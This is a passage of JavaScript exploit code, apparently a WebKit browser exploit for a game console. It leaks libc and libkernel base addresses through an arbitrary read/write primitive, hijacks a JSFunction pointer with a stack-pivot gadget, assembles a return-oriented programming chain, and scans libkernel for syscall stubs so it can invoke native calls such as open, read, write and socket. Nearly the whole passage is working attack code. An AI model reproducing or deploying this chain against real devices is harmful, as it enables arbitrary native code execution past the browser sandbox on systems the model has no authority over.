  logger.debug(`strerror_addr: ${strerror_addr}`);

  libc_base = strerror_addr.sub(constants.c_strerror);
  logger.info(`libc base: ${libc_base}`);

  _error_addr = arw.view(webkit_base).getBInt(constants.wk___imp___error, true);
  logger.debug(`_error_addr: ${_error_addr}`);

  libkernel_base = _error_addr.sub(constants.k__error);
  logger.info(`libkernel base: ${libkernel_base}`);

  let m_function_pivot;

  if (version.major === 6) {
    m_function_pivot = g_NativeCodePoison.xor(gadgets.MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_120);
  } else if (version.major < 9) {
    m_function_pivot = gadgets.MOV_RDI_RDI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX_40;
  } else {
    m_function_pivot = gadgets.MOV_RDI_RSI_30_MOV_RAX_QWORD_PTR_RDI_CALL_QWORD_PTR_RAX;
  }

  arw.view(m_executableOrRareData).setBInt(constants.wk_JSFunction_m_function, m_function_pivot, true);

  rop.pivot = new Pivot();
  rop.stack = new Stack(0x2000);
  rop.frame = new Frame(["jmp_rax", "rsp", "rax", "rip", "rdi", "rsi", "rdx", "rcx", "r8", "r9"]);

  rop.insts.push(gadgets.POP_RAX_RET);
  rop.insts.push(rop.frame.addrof("jmp_rax"));
  rop.insts.push(gadgets.PUSH_RBP_JMP_QWORD_PTR_RAX);

  rop.frame.store(rop.insts, "rsp");

  rop.insts.push(gadgets.POP_RAX_RET);
  rop.frame.valueof(rop.insts, "rax");

  rop.insts.push(gadgets.POP_RDI_RET);
  rop.frame.valueof(rop.insts, "rdi");

  rop.insts.push(gadgets.POP_RSI_RET);
  rop.frame.valueof(rop.insts, "rsi");

  rop.insts.push(gadgets.POP_RDX_RET);
  rop.frame.valueof(rop.insts, "rdx");

  rop.insts.push(gadgets.POP_RCX_RET);
  rop.frame.valueof(rop.insts, "rcx");

  rop.insts.push(gadgets.POP_R8_RET);
  rop.frame.valueof(rop.insts, "r8");

  rop.insts.push(gadgets.POP_R9_RET);
  rop.frame.valueof(rop.insts, "r9");

  rop.frame.valueof(rop.insts, "rip");

  rop.frame.store(rop.insts, "rax");

  rop.frame.load(rop.insts, "rsp");
  rop.insts.push(gadgets.PUSH_RAX_POP_RBP_RET);
  rop.insts.push(gadgets.POP_RAX_RET);
  rop.insts.push(0);
  rop.insts.push(gadgets.LEAVE_RET);

  fn._error = new NativeFunction(_error_addr, "bint");
  fn._strerror = new NativeFunction(strerror_addr, "string");

  logger.info("Achieved ROP !!");
}

function init_syscalls() {
  logger.info("Initiate SYSCALLS...");

  scan_syscalls(libkernel_base);

  // syscall functions
  fn.read = new NativeFunction(0x3, "bint");
  fn.write = new NativeFunction(0x4, "bint");
  fn.open = new NativeFunction(0x5, "number");
  fn.close = new NativeFunction(0x6, "number");
  fn.fstat = new NativeFunction(0xbd, "number");
  fn.sysctl = new NativeFunction(0xca, "number");
  fn.nanosleep = new NativeFunction(0xf0, "number");
  fn.socket = new NativeFunction(0x61, "number");
  fn.dlsym = new NativeFunction(0x24f, "number");
  fn.dup = new NativeFunction(0x29, "number");
  fn.getpid = new NativeFunction(0x14, "number");

  logger.info("Initiated SYSCALLS !!");
}

function scan_syscalls(base) {
  if (syscalls.size > 0) {
    logger.info(`Already found ${syscalls.size} syscalls !!`);
    return;
  }

  const size = 0x40000;
  const pattern = [0x48, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x49, 0x89, 0xca, 0x0f, 0x05];
  const pattern_end = pattern.length - 1;

  const u8 = new Uint8Array(ArrayBuffer.from(base, size));

  let i = 0;
  let match = 0;
  let offset = 0;
  while (offset < size) {
    const b = u8[offset];
    const c = pattern[i];

    if (b === c || c === 0xff) {
      if (i === 0) {
        match = offset;
      }

      i++;

      if (i === pattern_end) {
        const addr = base.add(match);
        const id = arw.view(addr).getInt32(3, true);

        syscalls.set(id, addr);

        i = 0;
      }
    } else {
      i = 0;
    }

    offset++;
  }

  logger.info(`Found ${syscalls.size} syscalls !!`);
}
//#endregion
//#region Structs
const timespec = new Struct("timespec", [
  { type: "Int64", name: "tv_sec" },
  { type: "Int64", name: "tv_nsec" },
]);
//#endregion
